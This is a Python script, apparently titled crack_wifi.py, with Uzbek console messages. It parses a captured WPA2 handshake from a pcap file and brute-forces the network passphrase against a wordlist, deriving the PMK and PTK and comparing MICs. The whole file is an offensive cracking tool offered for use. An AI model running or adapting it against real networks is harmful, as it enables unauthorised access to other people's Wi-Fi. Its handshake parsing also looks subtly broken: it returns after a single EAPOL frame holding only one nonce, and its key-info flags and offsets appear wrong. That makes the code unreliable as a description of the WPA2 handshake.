import sys
import hmac
import hashlib
import binascii
import time
from scapy.all import rdpcap, EAPOL, Raw, Dot11Beacon, Dot11Elt, Dot11

def extract_ssid(packets):
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            return ssid
    return None

def find_handshake(packets):
    eapol_packets = []
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            if pkt.haslayer(Dot11):
                # 802.11 header
                ap_mac = pkt.addr2
                client_mac = pkt.addr1
            else:
                # Ethernet header
                ap_mac = pkt.src
                client_mac = pkt.dst
            
            if pkt.haslayer(Raw):
                eapol_packet = pkt[EAPOL]
                raw = pkt[Raw].load
                
                # Check for Key Descriptor Version (should be 2 for WPA2)
                key_info = eapol_packet.load[1:3]
                key_info = int.from_bytes(key_info, byteorder='big')
                key_desc_ver = (key_info >> 4) & 0x07
                
                if key_desc_ver == 2:  # WPA2
                    # Extract ANonce and SNonce
                    if len(raw) >= 17:
                        key_data_len = int.from_bytes(raw[16:18], byteorder='big')
                        if len(raw) >= 17 + key_data_len:
                            anonce = raw[17:49] if key_info & 0x80 else None  # Message 1 has ANonce
                            snonce = raw[17:49] if key_info & 0x40 else None  # Message 2 has SNonce
                            
                            # Extract MIC (last 16 bytes of EAPOL payload)
                            mic = raw[81:97] if len(raw) >= 97 else None
                            
                            if mic and (anonce or snonce):
                                # Construct EAPOL data for MIC calculation
                                eapol_data = raw[:81] + bytes(16) + raw[97:]
                                return (
                                    ap_mac.replace(":", "").lower(),
                                    client_mac.replace(":", "").lower(),
                                    anonce, snonce, 
                                    binascii.hexlify(mic).decode(),
                                    eapol_data
                                )
    return None, None, None, None, None, None

def get_pmk(passphrase, ssid):
    return hashlib.pbkdf2_hmac('sha1', passphrase.encode('utf-8'), ssid.encode('utf-8'), 4096, 32)

def get_ptk(pmk, a_mac, s_mac, anonce, snonce):
    # PTK = PRF(PMK, "Pairwise key expansion",
    #           Min(AA,SPA) || Max(AA,SPA) ||
    #           Min(ANonce,SNonce) || Max(ANonce,SNonce))
    
    a = b"Pairwise key expansion\x00"
    
    # Determine min and max MACs
    if a_mac < s_mac:
        min_mac = binascii.unhexlify(a_mac)
        max_mac = binascii.unhexlify(s_mac)
    else:
        min_mac = binascii.unhexlify(s_mac)
        max_mac = binascii.unhexlify(a_mac)
    
    # Determine min and max nonces
    if anonce < snonce:
        min_nonce = anonce
        max_nonce = snonce
    else:
        min_nonce = snonce
        max_nonce = anonce
    
    # Create the seed
    seed = min_mac + max_mac + min_nonce + max_nonce
    
    # Generate PTK using PRF
    ptk = b''
    for i in range(4):  # 4 iterations to get 512 bits (64 bytes)
        ptk += hmac.new(pmk, a + seed + bytes([i]), hashlib.sha1).digest()
    
    return ptk[:64]  # Return first 64 bytes (512 bits)

def crack_wifi(cap_file, wordlist_file):
    packets = rdpcap(cap_file)
    ssid = extract_ssid(packets)
    if not ssid:
        ssid = input("SSID topilmadi. Qo'lda kiriting: ")

    ap_mac, client_mac, anonce, snonce, real_mic, eapol = find_handshake(packets)
    if not all([ap_mac, client_mac, anonce, snonce, real_mic, eapol]):
        print("[!] To'liq handshake topilmadi.")
        return

    print(f"[i] SSID: {ssid}")
    print(f"[i] AP MAC: {ap_mac}")
    print(f"[i] Client MAC: {client_mac}")
    print("[i] Parollar sinovda...")

    start_time = time.time()
    checked = 0

    with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            passphrase = line.strip()
            if not passphrase:
                continue

            checked += 1

            try:
                pmk = get_pmk(passphrase, ssid)
                ptk = get_ptk(pmk, ap_mac, client_mac, anonce, snonce)
                
                # Calculate MIC
                kck = ptk[:16]  # First 16 bytes of PTK is KCK
                mic = hmac.new(kck, eapol, hashlib.sha1).hexdigest()[:32]

                elapsed = time.time() - start_time
                rate = checked / elapsed if elapsed > 0 else 0

                print(f"[{checked}] Sinov: {passphrase} | {rate:.2f} parol/s | {int(elapsed)}s", end='\r')

                if mic.lower() == real_mic.lower():
                    print(f"\n[+] Parol topildi: {passphrase}")
                    return
            except Exception as e:
                print(f"\n[!] Xato yuz berdi: {e}")
                continue

    print("\n[-] Parol topilmadi.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Foydalanish: python crack_wifi.py handshake.cap wordlist.txt")
        sys.exit(1)

    crack_wifi(sys.argv[1], sys.argv[2])